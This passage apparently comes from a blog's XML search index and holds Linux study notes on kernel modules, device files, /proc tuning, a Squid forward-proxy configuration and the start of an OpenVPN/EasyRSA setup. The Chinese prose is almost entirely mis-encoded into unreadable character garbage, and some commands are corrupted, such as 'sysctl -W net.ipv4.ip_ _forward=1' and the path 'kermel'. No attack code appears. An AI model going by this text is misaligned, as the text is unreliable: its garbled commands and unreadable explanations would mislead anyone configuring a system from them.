¸æ¯å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œéƒ½åœ¨å†…å­˜ä¸­ä¸ºå…¶åˆ†é…ç‹¬äº«çš„ä¸€æ®µå†…å­˜åŒºåŸŸå­˜æ”¾æ•°æ®ã€ä»£ç  æŸ¥çœ‹å½“å‰è¿›ç¨‹ ps ps -ax # å»ºè®®åŠ å‚æ•° ## æ˜¾ç¤ºçš„å­—æ®µå«ä¹‰ # PIDï¼šè¿›ç¨‹ID # STATï¼šè¿›ç¨‹çŠ¶æ€(Sleepã€ Sleep and Waitã€Run) # [process] swapping out å¸¦æ”¾æ‹¬å·çš„éƒ½æ˜¯æ”¾åˆ°è™šæ‹Ÿå†…å­˜ä¸­çš„ ç¡¬ä»¶ç®¡ç† ä¸ç³»ç»Ÿé€šä¿¡çš„æ‰€æœ‰ç¡¬ä»¶éƒ½éœ€è¦å°†é©±åŠ¨æ¤å…¥å†…æ ¸ å†…æ ¸ç¼–è¯‘åŒæ—¶åŒ…å«ç¡¬ä»¶é©±åŠ¨(æ—©æœŸå”¯ä¸€æ–¹æ³•) é©±åŠ¨ç¨‹åºä»¥å†…æ ¸æ¨¡å—å‹å¼åŠ è½½ å†…æ ¸æ¨¡å—æ˜¯ä¸€ä¸ªè‡ªåŒ…å«çš„é©±åŠ¨ç¨‹åºåº“ï¼Œå¯åŠ¨æ€ä¸å†…æ ¸é“¾æ¥/å–æ¶ˆé“¾æ¥ Linuxç³»ç»Ÿçš„ä¸‰ç§ç¡¬ä»¶è®¾å¤‡æ–‡ä»¶`bash å­—ç¬¦è®¾å¤‡æ–‡ä»¶: ä¸€æ¬¡åªèƒ½å¤„ç†ä¸€ä¸ªå­—ç¬¦æ•°æ®çš„è®¾å¤‡(è°ƒåˆ¶è§£è°ƒå™¨ã€ç»ˆç«¯) c å—è®¾å¤‡æ–‡ä»¶: ä¸€æ¬¡èƒ½å¤„ç†ä¸€å¤§å—æ•°æ®çš„è®¾å¤‡(ç¡¬ç›˜) b ç½‘ç»œè®¾å¤‡æ–‡ä»¶:ä½¿ç”¨åŒ…æ¥å‘é€å’Œæ¥æ”¶æ•°æ®çš„è®¾å¤‡(ç½‘å¡)` Linuxä¸ºç³»ç»Ÿä¸Šçš„æ¯ä¸ªç¡¬ä»¶è®¾å¤‡åˆ›å»ºç§°ä¸ºèŠ‚ç‚¹çš„ç‰¹æ®Šæ–‡ä»¶ å†…æ ¸é€šè¿‡å”¯ä¸€çš„æ•°å­—å¯¹æ ‡è¯†æ¯ä¸ªèŠ‚ç‚¹(ä¸»ã€æ¬¡) åŒç±»å‹è®¾å¤‡ä¸»èŠ‚ç‚¹å·ç›¸åŒï¼ŒåŒä¸€ä¸»èŠ‚ç‚¹å·ä¸‹ï¼Œæ¬¡èŠ‚ç‚¹å·å”¯ä¸€`bashcd /dev &amp;&amp; ls -al sd ttySç»“æœæ˜¾ç¤ºbrw-rwâ€”- 1 root disk 8, 0 12æœˆ5 15:14 sda # 8ï¼Œ0 ä¸»è®¾å¤‡æ ‡è¯†/æ¬¡è®¾å¤‡æ ‡è¯†brw-rwâ€”- 1 root disk 8, 1 12æœˆ5 15:14 sda1brw-rwâ€”- 1 root disk 8, 16 12æœˆ5 15:14 sdbbrw-rwâ€”- 1 root disk 8, 17 12æœˆ5 15:14 sdb1crw- -rWâ€”- 1 root uucp 4, 64 12æœˆ5 15:14 ttyS0crw-rwâ€”- 1 root uucp 4, 65 12æœˆ5 15:14 ttyS1 #### æ–‡ä»¶ç³»ç»Ÿç®¡ç† æ–‡ä»¶ç³»ç»Ÿå®šä¹‰OSå¦‚ä½•åœ¨å­˜å‚¨è®¾å¤‡ä¸Šå­˜å‚¨æ•°æ® - åˆ†åŒºã€æ ¼å¼åŒ– - Linux æ”¯æŒåŒ…æ‹¬Windowsåœ¨å†…çš„ä¼—å¤šæ–‡ä»¶ç³»ç»Ÿ - å†…æ ¸ç»Ÿä¸€ä½¿ç”¨Virtual File System (`VFS`) ä¸ä¸åŒæ–‡ä»¶ç³»ç»Ÿè¿›è¡Œäº¤äº’ #### å†…æ ¸çš„æ–‡ä»¶æ„æˆ **å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶** - å†…æ ¸ç¨‹åºæœ¬èº«ï¼ŒBootLoaderåŠ è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œçš„å†…å®¹(ä½äº`/boot`æˆ–`/`ä¸­) - åŸºäºç¼–è¯‘æ‰“åŒ…çš„é©±åŠ¨æ•°é‡ä¸åŒï¼Œå†…æ ¸=è¿›åˆ¶æ–‡ä»¶å¯èƒ½å¾ˆå¤§ - å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶é€šå¸¸è¢«å‹ç¼©ï¼Œä»¥ä¾¿åŠ è½½å†…æ ¸æ—¶èŠ‚çœå†…å­˜ç©ºé—´ - å‹ç¼©æ–¹å¼ä¸åŒï¼Œå°†å¯¼è‡´å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶åç§°å·®å¼‚ | ä¸åŒçš„Linuxå†…æ ¸æ–‡ä»¶ | å¤‡æ³¨ | | ------------------ | ----------------------------------------------------- | | bzimage | ï¼ˆå¸¸ç”¨ï¼‰GNU zipå‹ç¼©çš„å¤§å†…æ ¸ï¼Œå¸¸è¢«æ‹·è´ä¸º4(vmlinuz) | | kernel | æœªå‹ç¼© | | vmlinux | æœªå‹ç¼©ï¼Œé€šå¸¸ä¸ç”¨ä½œæœ€ç»ˆçš„å¼•å¯¼ç‰ˆæœ¬ | | vmlinuz | é€šç”¨çš„å‹ç¼©æ–‡ä»¶ï¼ˆå¦‚ubuntuä¸‹ï¼švmlinuz-4.15.0-65-genericï¼‰ | | zimage | ä½¿ç”¨GNU zipå‹ç¼©çš„å°å†…æ ¸ | | | | #### å†…æ ¸æ¨¡å— **å†…æ ¸ç›´æ¥ä¸ç¡¬ä»¶äº¤äº’** - å†…æ ¸ä¸ç¡¬ä»¶é€šä¿¡éœ€è¦é©±åŠ¨ç¨‹åºçš„æ”¯æŒ - å°†ç¡¬ä»¶é©±åŠ¨å’Œå†…æ ¸çš„`æºç `ä¸€å¹¶ç¼–è¯‘æˆäºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶(ä½“ç§¯å¤§) - å°†é©±åŠ¨ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶çš„æ¨¡å—å¯¹è±¡æ–‡ä»¶`.ko`ï¼Œ è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥ **ç¡¬ä»¶é©±åŠ¨çš„å‘å¸ƒ** - æºç ï¼šå¼€æºç²¾ç¥ - äºŒè¿›åˆ¶æ–‡ä»¶ï¼šä¿æŠ¤éšç§ã€åŠŸèƒ½ç‰¹æ€§ **å†…æ ¸æ¨¡å—(`modprob`)** ```bash /lib/modules/&lt;version&gt;/kernel/*.ko å†…æ ¸æºç è·å¾— Linuxå†…æ ¸å¼€å‘åº“(www.kernel.org â€“&gt; ç¨³å®šç‰ˆã€å¼€å‘ç‰ˆ) å¯¹åº”Linuxå‘è¡Œç‰ˆçš„è½¯ä»¶åº“(å¯¹æœ¬å‘è¡Œç‰ˆæœ€ç¨³å¦¥ï¼Œä¸‹è½½æ–¹ä¾¿) ä¸‹è½½æºç è§£å‹è‡³/usr/src/linux (å†…æ ¸å·¥å…·é»˜è®¤æŸ¥æ‰¾è·¯å¾„)é“¾æ¥åˆ°æŒ‡å®šç‰ˆæœ¬ /usr/src/linux-5.3.12 # ç»´æŠ¤å¤šä¸ªç‰ˆæœ¬ /usr/src/kernels # Redhat å†…æ ¸è¡¥ä¸ é’ˆå¯¹bugä¿®å¤å’Œå®‰å…¨è¡¥ä¸çš„å¢é‡å†…æ ¸å‘è¡Œç‰ˆ å†…æ ¸è¡¥ä¸ç‰ˆæœ¬(é’ˆå¯¹ä¸»ç‰ˆæœ¬çš„è¡¥ä¸) åªåŒ…å«åº”ç”¨äºä¸»å†…æ ¸æºä»£ç å‘è¡Œç‰ˆä»¥è·å¾—å¢é‡å‘è¡Œç‰ˆçš„æ›´æ”¹(5.3 â€“&gt; 5.3.1) ä½¿ç”¨patchå‘½ä»¤å°†è¡¥ä¸æºç åŒ…åº”ç”¨äºä¸»æºç åŒ…ï¼Œç„¶åé‡æ–°ç¼–è¯‘ åç»­è¡¥ä¸ç‰ˆæœ¬(5.3.1 -&gt; 5.3.2) å¸è½½æ—©æœŸç‰ˆæœ¬è¡¥ä¸(patch -R) patchæ–°ç‰ˆæœ¬è¡¥ä¸ é‡æ–°ç¼–è¯‘ å†…æ ¸å¤´Linuxå†…æ ¸ç»å¤§éƒ¨åˆ†ä½¿ç”¨Cè¯­è¨€ç¼–å†™ - Cè¯­è¨€å¤´æ–‡ä»¶:ç¼–è¯‘æ—¶éœ€è¦çš„åº“æ–‡ä»¶ - ç¼–è¯‘å†…æ ¸ã€æ¨¡å—éƒ½éœ€è¦ç›¸åŒçš„å†…æ ¸å¤´(åº“æ–‡ä»¶) Ubuntuå†…æ ¸å¤´ sudo apt install linux-headers-4.15.0-72-generic /usr/src/linux-headers-4.1 5.0-72-generic/include/config/*.h # ubuntu /usr/src/kernels # Redhat # ä¸åŒå‘è¡Œç‰ˆè·¯å¾„ä¸åŒ # æŸ¥çœ‹ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬ uname -r å†…æ ¸æ–‡æ¡£ è®¸å¤šç‹¬ç«‹çš„æ–‡æœ¬æ–‡ä»¶ï¼Œè¯´æ˜æ¯ä¸ªæºä»£ç æ–‡ä»¶åœ¨å†…æ ¸ç»“æ„ä¸­çš„ä½œç”¨ é’ˆå¯¹å†…æ ¸æºç åšä»»ä½•æ“ä½œä¹‹å‰ï¼Œå»ºè®®è¯¦ç»†é˜…è¯»æ–‡æ¡£ ç”±äºæ–‡æ¡£ä½“é‡å·¨å¤§ï¼Œé€šå¸¸ä»¥ç‹¬ç«‹åŒ…å½¢å¼å‘å¸ƒ æ–‡æ¡£è·¯å¾„/usr/src/linux/Documentation # Ubuntu /usr/src/kernels # Redhat å†…æ ¸ç‰ˆæœ¬ ä¸ƒä¸ªå†…æ ¸ç‰ˆæœ¬å‘½åæ–¹å¼(ç³»ç»Ÿ) Linusäº1991å¹´9æœˆå‘å¸ƒäº†åˆå§‹Linuxå†…æ ¸ç‰ˆæœ¬å·0.01 0è¡¨ç¤ºè¯¥ç‰ˆæœ¬ç›®çš„æ˜¯æµ‹è¯•ï¼Œå¹¶éç”Ÿäº§ç¯å¢ƒä½¿ç”¨(å»¶ç”¨è‡³0.95 â€“ 1 992.3) 1994å¹´3æœˆï¼ŒLinus å‘å¸ƒäº†Linux çš„ç¬¬ä¸€ä¸ªç”Ÿäº§ç‰ˆæœ¬1.0 (1.x.y) xä¸»ç‰ˆæœ¬å·(å¥‡æ•°è¡¨ç¤ºæµ‹è¯•/å¼€å‘ç‰ˆæœ¬ï¼›å¶æ•°è¡¨ç¤ºç¨³å®š/ç”Ÿäº§ç‰ˆæœ¬) yä¸»ç‰ˆæœ¬ä¸‹çš„è¡¥ä¸ç‰ˆæœ¬ æ­¤ç‰ˆæœ¬å·å»¶ç”¨è‡³ 1.3 (1995.5) 1.3ä¹‹åLinuxå†…æ ¸å˜åŒ–å¾ˆå¤§ï¼Œå› æ­¤ä¸‹ä¸€ä¸ªç‰ˆæœ¬ä¸º2.0 (1996.6) 2.x.yå»¶ç”¨1.x.y çš„å‘½åæ–¹å¼ï¼Œç›´è‡³2.4 (2001.1) 2003.12 Linuså‘å¸ƒ2.6.0ç‰ˆæœ¬ï¼Œå¯åŠ¨äº†ä¸€ä¸ªæ–°çš„ç‰ˆæœ¬å‘½åç³»ç»Ÿ ç”±äº2.6å†…æ ¸éå¸¸ç¨³å®šï¼Œå› æ­¤æ–°å†…æ ¸ç‰ˆæœ¬æ ¼å¼ä¸º2.6.x.yï¼ˆä¸å†é€šè¿‡å¥‡å¶æ•°æ¥åŒºåˆ†ç¨³å®šä¸å¦ï¼‰ 2.6 æ¯ä¸ªç‰ˆæœ¬éƒ½æ˜¯ç”Ÿäº§ç‰ˆæœ¬(å¼€å‘ç‰ˆç»“å°¾ä¸º-rc) æ­¤ç‰ˆæœ¬å»¶ç”¨è‡³2.6.39 (2011.5) 2011.7 Linusä¸ºåº†ç¥Linuxå†…æ ¸20å²ç”Ÿæ—¥ï¼Œå¯åŠ¨äº†å†…æ ¸çš„3.0ç‰ˆæœ¬ 3.x.y (å¼€å‘ç‰ˆåœ¨ç»“å°¾åŠ -rc) -ç›´å»¶ç”¨è‡³3.19 (2015.2) 3.x.y-z ä¸´æ—¶ç‰¹æ®Šè¡¥ä¸ç‰ˆ(ä¸»è¦ä¸ç´§æ€¥çš„å®‰å…¨ä¿®å¤æœ‰å…³) 2015.4å‘å¸ƒ4.0ç‰ˆæœ¬ 4.x.y (ä¸3.0ç›¸åŒ) 4.x.y-z (yçš„ç¬¬zæ¬¡å¾®è°ƒç‰ˆæœ¬) 2019.3å‘å¸ƒ5.0ç‰ˆæœ¬ ç›®å‰æœ€æ–°ï¼Œå‘½åå»¶ç”¨ä»¥å‰ æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ uname -r ç»´æŠ¤å†…æ ¸ æ‰‹åŠ¨ç¼–è¯‘å†…æ ¸(è¾ƒå°‘ä½¿ç”¨ï¼Œå¿½ç•¥) ä½¿ç”¨å‘è¡Œç‰ˆåŒ…ç®¡ç†å™¨ç»´æŠ¤å†…æ ¸ï¼ˆå»ºè®®çš„æ–¹å¼ï¼‰ æ¨¡å—æ–‡ä»¶/lib/modules/version/kermel/*.ko æ‰‹åŠ¨ç¼–è¯‘å†…æ ¸æ¨¡å—ï¼Œå½“å‡çº§å†…æ ¸æ—¶éœ€è¦é‡æ–°ç¼–è¯‘æ¨¡å— Dynamic Kernel Module Support (DKMS) æ³¨å†Œè‡ªå®šä¹‰æ¨¡å—åï¼Œdkmsç›‘è§†å†…æ ¸å˜åŒ–ï¼Œå¹¶è‡ªåŠ¨è¿è¡Œè„šæœ¬é‡æ–°ç¼–è¯‘å®‰è£…æ¨¡å— å¸¸ç”¨æ¨¡å—å‘½ä»¤# å·²å®‰è£…æ¨¡å—åˆ—è¡¨ lsmod # æ¨¡å—ä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³» # æŸ¥çœ‹æ¨¡å—è¯¦ç»†ä¿¡æ¯ modinfo bluetooth # æ¯”å¦‚æŸ¥çœ‹è“ç‰™æ¨¡å—çš„ä¿¡æ¯ # å®‰è£…/åˆ é™¤æ¨¡å— insmod / rmmod # éœ€æŒ‡å®š'å®Œæ•´'å†…æ ¸æ¨¡å—æ–‡ä»¶è·¯å¾„(ä¾èµ–æ¨¡å—æœªåŠ è½½æ—¶å¤±è´¥) modprobe -r # æˆ–è€…è¿™ç§æ–¹å¼å®‰è£…ï¼Œåªéœ€æŒ‡å®šæ¨¡å—åï¼Œè‡ªåŠ¨å®‰è£…ä¾èµ–ï¼ˆæ¯”è¾ƒå‹å¥½ï¼‰ å†…æ ¸æ’é”™æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ uname -r # -aæ˜¾ç¤ºå…¨éƒ¨ä¿¡æ¯ /procç›®å½• # Linuxå†…æ ¸åˆ›å»ºçš„åŠ¨æ€ä¼ªç›®å½• # åœ¨å†…æ ¸è¿è¡Œæ—¶æŸ¥çœ‹å†…æ ¸ç›¸å…³çš„é…ç½®ã€æ€§èƒ½ # åŒ…å«ç¡¬ä»¶ä¿¡æ¯ /proc/interrupts # è¢«åˆ†é…çš„ä¸­æ–­ä¿¡æ¯ /proc/ioports # I0ç«¯å£ä½¿ç”¨æƒ…å†µ /proc/dma # DMA lsdev # æŸ¥çœ‹ä»¥ä¸Šç»¼åˆå‚æ•°çš„å‘½ä»¤ï¼Œapt install lsdev cat /proc/sys/kernel/version # æŸ¥çœ‹å†…æ ¸å‚æ•° ## ä¿®æ”¹å†…æ ¸å‚æ•° cat /proc/sys/net/ipv4/ip_forward/ # å¦‚ï¼šå¼€å¯è·¯ç”±åŠŸèƒ½ï¼ŒæŸ¥çœ‹ echo 1 > /proc/sys/net/ipv4/ip_forward # å¦‚ï¼šå¼€å¯è·¯ç”±åŠŸèƒ½ï¼Œä¿®æ”¹ sysctl net.ipv4.ip_ forward1 # æˆ–è€…ä½¿ç”¨å‘½ä»¤ï¼ŒæŸ¥çœ‹ /sysctl -W net.ipv4.ip_ _forward=1 # ä½¿ç”¨å‘½ä»¤å¼€å¯ï¼Œä¿®æ”¹ /etc/sysctl.conf # net.ipv4.ip_ forward = 1 ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè®©å®ƒæ°¸ä¹…ç”Ÿæ•ˆ # å…¶ä»–å‘è¡Œç‰ˆå¯èƒ½åœ¨è¿™ä¸ªç›®å½•ä¿®æ”¹ /etc/sysctl.d document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>å¼•å¯¼è¿‡ç¨‹</tag>
        <tag>BIOS</tag>
        <tag>UEFI</tag>
        <tag>grub</tag>
        <tag>å†…æ ¸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-ä»£ç†&VPN]]></title>
    <url>%2Fposts%2F39742%2F</url>
    <content type="text"><![CDATA[ä½ çœ‹è§çš„ä¸æ˜¯ä½ çœŸçš„çœ‹è§çš„ æ—¶é—´ã€å¸¦å®½ã€ç®¡æ§éƒ½å½±å“ç½‘ç»œä½¿ç”¨ä½“éªŒ ä½œä¸ºæ”¹å–„æŠ€æœ¯ï¼ŒVPN/ä»£ç†å’Œçªç ´é™åˆ¶æ”¹å–„ä½“éªŒ åŒºåˆ«ï¼šä»£ç†ä¸»è¦æé«˜è®¿é—®é€Ÿåº¦ï¼›VPNæ›´æ³¨é‡å®‰å…¨æ€§ åœ¨æŸäº›åº”ç”¨åœºæ™¯ä¸­ï¼Œä½œç”¨éå¸¸ç›¸ä¼¼ ä½œä¸ºä¸­é—´å±‚ï¼ŒåŒå‘æ¨¡æ‹Ÿï¼ˆç¿»å¢™ï¼‰ ã€è®¿é—®è€…ã€‘ â€“&gt; ã€ä¸­é—´å±‚ã€‘ â€“&gt; ã€ç›®æ ‡ã€‘ ä»£ç†(Proxy)ç½‘ç»œä»£ç†æœåŠ¡ å®¢æˆ·ç«¯è®¿é—®è¯·æ±‚å‘ç»™Proxyï¼Œè€Œéç›´è¿ç›®æ ‡ ä»£ç†è½¬å‘è¯·æ±‚ç»™ç›®æ ‡ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™å®¢æˆ· æ­£å‘ä»£ç†æé«˜é€Ÿåº¦ã€å†…å®¹æ§åˆ¶ã€å®‰å…¨ï¼ˆä»£æ›¿æ­£å¸¸ç”¨æˆ·æ¥è®¿é—®èµ„æºï¼‰ åå‘ä»£ç†é€Ÿåº¦ã€å®‰å…¨ã€åˆ†å‘ï¼ˆä»£æ›¿ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ¥æ”¶èµ„æºï¼Œè½¬å‘ç»™åé¢çš„ä»£ç†æœåŠ¡å™¨ï¼Œç„¶åæŠŠåé¢ä»£ç†æœåŠ¡å™¨èµ„æºåˆ†å‘ç»™ç”¨æˆ·ã€‚æ¯”å¦‚Nginxåå‘ä»£ç†ï¼‰å®‰å…¨æ€§ï¼šåå‘ä»£ç†æœåŠ¡å™¨ä¸Šå¯ä»¥è¿›è¡Œå®‰å…¨æ€§è¿‡æ»¤ï¼Œæ¯”å¦‚wafç­‰ Squid å…¨é¢çš„ä¸€ä¸ªä»£ç†è½¯ä»¶ ç”¨squidå®ç°æ­£å‘ä»£ç†1.å®‰è£…squid sudo apt install squid 2.é…ç½® vim /etc/squid/squid.conf # ä¸»é…ç½®æ–‡ä»¶ # aclï¼šè®¿é—®æ§åˆ¶åˆ—è¡¨/èµ„æºåˆ—è¡¨ acl localnet src 192.168.0.0/16 # å…ˆé…ç½®å†…éƒ¨ç½‘æ®µï¼ŒæŒ‡å®šæºåœ°å€ï¼Œåªç»™è¿™ä¸ªç½‘æ®µåšä»£ç† acl menhu111 dstdomain .sina.com .sina.com.cn .163.com # ç›®æ ‡åŸŸåï¼Œå¤šä¸ªä»¥ç©ºæ ¼åˆ†éš”ã€‚å°å¿ƒé¡µé¢å…ƒç´ CSSã€å›¾ç‰‡(æœ‰äº›èµ„æºä¸å±äºé‚£ä¸ªåŸŸçš„ä¸‹é¢) acl xiaban111 time MTWHFAS 18:00-23:59 # å®šä¹‰æ—¶é—´ï¼Œä¸‹ç­æ—¶é—´ï¼ŒMTWHFASï¼ˆå‘¨1-7ï¼‰ï¼Œä¸é™åˆ¶è®¿é—®ã€‚æ˜¯æœåŠ¡å™¨æœ¬åœ°æ—¶é—´ # Mon, Tues, Wednes, tHurs, Fri, sAtur, Sun, D: å·¥ä½œæ—¥ acl noexes url_regex -i \.exe$ # URLä»¥exeç»“å°¾ï¼ˆ-iå¤§å°å†™ä¸æ•æ„Ÿï¼‰ acl httpsurls url_regex -i ^https # ä»¥ ^URLèµ·å§‹ acl noporn url_regex -i sex # acl zipfiles url_regex -i \.zip$ # httpè®¿é—®è§„åˆ™é¡ºåºåŒ¹é…ï¼ˆæŒ‰å‰åé¡ºåºæ‰§è¡Œï¼‰ # åŸåˆ™ï¼šã€ç¦æ­¢è§„åˆ™ã€‘ä¸€å®šè¦æ”¾åœ¨ã€å…è®¸è§„åˆ™ã€‘å‰é¢ http_access deny !Safe_ports # ä¸æ˜¯Safe_portsçš„ç«¯å£ï¼Œéƒ½ç¦æ­¢ http_access deny noexes noporn # åŸåˆ™ï¼šã€ç¦æ­¢è§„åˆ™ã€‘ä¸€å®šè¦æ”¾åœ¨ã€å…è®¸è§„åˆ™ã€‘å‰é¢ http_access deny CONNECT !SSL_ports # å¦‚æœä¸æ˜¯SSL_portsçš„ç«¯å£ï¼Œå¦‚æœå‘èµ·Connectè¯·æ±‚çš„è¯ï¼Œä¹Ÿæ˜¯ç¦æ­¢çš„ http_access allow localhost # å…è®¸æ‰€æœ‰äººè¯·æ±‚æˆ‘ä»£ç†æœåŠ¡å™¨çš„æœ¬åœ° http_access allow localnet menhu111 xiaban111 # å…è®¸æœ¬åœ°åœ°å€è®¿é—®åé¢æŒ‡å®šçš„ç›®æ ‡åŸŸå http_access allow localhost manager # ç¼“å­˜åˆ°ä»£ç†æœåŠ¡å™¨æœ¬åœ° http_access deny manager http_access deny all # é™¤äº†ä¸Šé¢æ˜ç¡®å…è®¸çš„ï¼Œå…¶ä»–çš„ä¸€æ¦‚ç¦æ­¢(è¿™æ¡è§„åˆ™è¦æ”¾åˆ°æœ€åé¢) # http_access allow all 3.ä¿®æ”¹å®Œä¹‹åï¼Œé‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ sudo kill -SIGHUP `cat /var/run/squid.pid` é»˜è®¤ä¾¦å¬3128ä»£ç†ç«¯å£ï¼Œåœ¨é…ç½®æ–‡ä»¶å¯ä»¥ä¿®æ”¹ http_port 3128 # é»˜è®¤ä¾¦å¬æ‰€æœ‰ç½‘å¡çš„æ‰€æœ‰3128ç«¯å£,å»ºè®®ä¸è¦å¯¹å…¬ç½‘å¼€æ”¾ä»£ç† # æŒ‡å®šä¾¦å¬ç½‘å¡ http_port 192.168.0.1:3128 è®¿é—®æ—¥å¿— access_log daemon:/var/log/squid/access.log squid ç¼“å­˜ cache_dir ufs /var/spool/squid3 100 16 256 # ç¼“å­˜è·¯å¾„ï¼Œå¤šå¤§ï¼Œå‘¨æœŸ refresh_pattern -i \.(gif|png|jpg|jpeg|ico)$ 3600 90% 86400 # ç¼“å­˜å›¾ç‰‡ VPNåŸç†ä¼ä¸šå†…éƒ¨ç³»ç»Ÿä¸åº”å¯¹å¤–å¼€æ”¾ å‡ºå·®åœ¨å¤–çš„ä¼ä¸šå‘˜å·¥éœ€è¦è®¿é—®å…¬å¸å†…éƒ¨ç³»ç»Ÿ åˆ†å…¬å¸ã€åˆä½œå•†éœ€è¦å®‰å…¨çš„è®¿é—®æŒ‡å®šä¼ä¸šå†…éƒ¨ç³»ç»Ÿ ä¸“çº¿ç½‘ç»œè´¹ç”¨é«˜æ˜‚ä¸”ä¸çµæ´» è¿œç¨‹è®¿é—®å®‰å…¨æ€§æ¬ ç¼º è™šæ‹Ÿä¸“ç”¨ç½‘(VPN â€“ Virtual Private Network) åŸºäºå¹¶ä¸å®‰å…¨çš„ç½‘ç»œçº¿è·¯ï¼Œé€šè¿‡åŠ å¯†æŠ€æœ¯æ„å»ºå®‰å…¨çš„ä¿¡æ¯é€šé“ï¼ˆtunnelï¼‰ VPNç”¨æˆ·è·å¾—å¦‚åŒåœ¨å†…ç½‘ä¸€æ ·çš„è®¿é—®ä½¿ç”¨ä½“éªŒ ä¸Proxyç›¸æ¯” VPNæ›´åŠ å®‰å…¨ã€æˆæœ¬é«˜ã€éƒ¨ç½²éš¾åº¦å¤§ VPNä¸€æ—¦éƒ¨ç½²å®Œæˆåç®€å•ä½¿ç”¨ Proxyå±äºä¸€ç§ä¸­é—´å±‚ï¼ŒVPNæ›´æ¥è¿‘è·¯ç”±ï¼ˆå¯¹åº”ç”¨é€æ˜ï¼Œæ— éœ€è®¾ç½®ä»£ç†ï¼‰ VPNæ›´å®Œå–„çš„è®¤è¯ã€åŠ å¯†ã€æˆæƒæ§åˆ¶ VPNç±»å‹ PPTP L2TPï¼ˆç”¨çš„å°‘ï¼‰ IPSecï¼ˆä¿å¯†æ€§è¦æ±‚å¾ˆé«˜ï¼Œè¿‡äºå¤æ‚ã€‚å¸¸ç”¨äºç½‘ç»œè¾¹ç•Œä¹‹é—´ï¼‰ SSLï¼ˆéå¸¸é€‚åˆç»ˆç«¯ç”¨æˆ·ï¼‰ OPenVPN å…¨ç‰¹æ€§çš„å¼€æºSSL VPN è·¨å¹³å° Windowsã€Linuxã€macoxã€iosã€android OpenVPN é€šè¿‡éå—ä¿¡ç½‘ç»œè¿æ¥ä¸Šç½‘æ—¶ä¿è¯å®‰å…¨ å‡ºå·®å‘˜å·¥è®¿é—®ä¼ä¸šå†…éƒ¨ç³»ç»Ÿ ä¼ªè£…ä¸ºå›½å¤–åœ°å€ï¼Œè§„é¿åœ°ç†é™åˆ¶å’Œå®¡æ ¸ï¼ˆç¿»å¢™ï¼‰ éœ€è¦ï¼ˆç‹¬ç«‹çš„ï¼‰è¯ä¹¦é¢å‘æœºæ„CAï¼Œå®ŒæˆPKIæ¶æ„ å®‰è£…&amp;é…ç½® ä¸€å°VPNæœåŠ¡å™¨ï¼Œä¸€å°CAæœåŠ¡å™¨ï¼ˆæ¯ä¸ªæœåŠ¡å™¨åªåšä¸€ä¸ªç”¨é€”ï¼‰ é¢˜å¤–è¯ï¼šubuntu server 1804ä¿®æ”¹ä¸»æœºåä¹‹å‰ï¼Œå…ˆæŠŠ/etc/cloud/cloud.confé…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ä¸ºçš„preserve_hostnameä¿®æ”¹ä¸ºtrueï¼Œç„¶åå†ä¿®æ”¹hostnameå’Œhosts 1.å®‰è£…OpenVPNï¼ˆåœ¨VPN Serverï¼‰ sudo apt install openvpn 2.å®‰è£…EasyRSA(åœ¨VPN Server+ åœ¨CA Server) # ubuntuè½¯ä»¶æºä¹Ÿæœ‰ï¼Œä½†æ˜¯ä¸æ˜¯æœ€æ–°çš„ï¼Œè¿™é‡Œå»githubä¸‹è½½æœ€æ–°çš„ # ca server å’Œvpn serveréƒ½éœ€è¦ä¸‹è½½EasyRSA(ä¸€ä¸ªä½œä¸ºå®¢æˆ·ç«¯ä¸€ä¸ªä½œä¸ºæœåŠ¡ç«¯) wget https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.6/EasyRSA-unix-v3.0.6.tgz tar -xvf EasyRSA-unix-v3.0.6.tgz 3.é…ç½®å®‰è£…ï¼ˆåœ¨CAæœåŠ¡å™¨ä¸Šï¼‰ cd ~/EasyRSA-v3.0.6/ cp vars.example vars #vim vars set_var EASYRSA_REQ_COUNTRY "CN" set_var EASYRSA_REQ_PROVICE "BJ" set_var EASYRSA_REQ_CITY "BJ" set_var EASYRSA_REQ_ORG LAB"" set_var EASYRSA_REQ_EMAIL "admin@lab.com" set_var EASYRSA_REQ_OU "IT" # åˆå§‹åŒ–PKIæ¶æ„ ./easyrsa init-pki # ä¼šåˆ›å»ºä¸€ä¸ªpkiçš„ç›®å½•ï¼Œä»¥åç”Ÿæˆçš„è¯ä¹¦ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œè¯ä¹¦çš„ç§é’¥ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹çš„privteä¸‹ï¼Œè¯ä¹¦ç”³è¯·æ–‡ä»¶ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹çš„reqsä¸‹ 4.åˆ›å»ºè¯ä¹¦é¢å‘æœºæ„ï¼Œç”ŸæˆCAå…¬ç§é’¥ï¼ˆåœ¨CA Serverï¼‰ ./easyrsa build-ca nopass #è¯ä¹¦ç§é’¥æ–‡ä»¶çš„è®¿é—®å¯†ç ï¼Œä½†æ˜¯è¿™é‡Œä¸è®¾ç½® # ä¸‹é¢è®¾ç½®è¯ä¹¦çš„åå­—ï¼Œé»˜è®¤ä¸æ”¹ # ca.crt 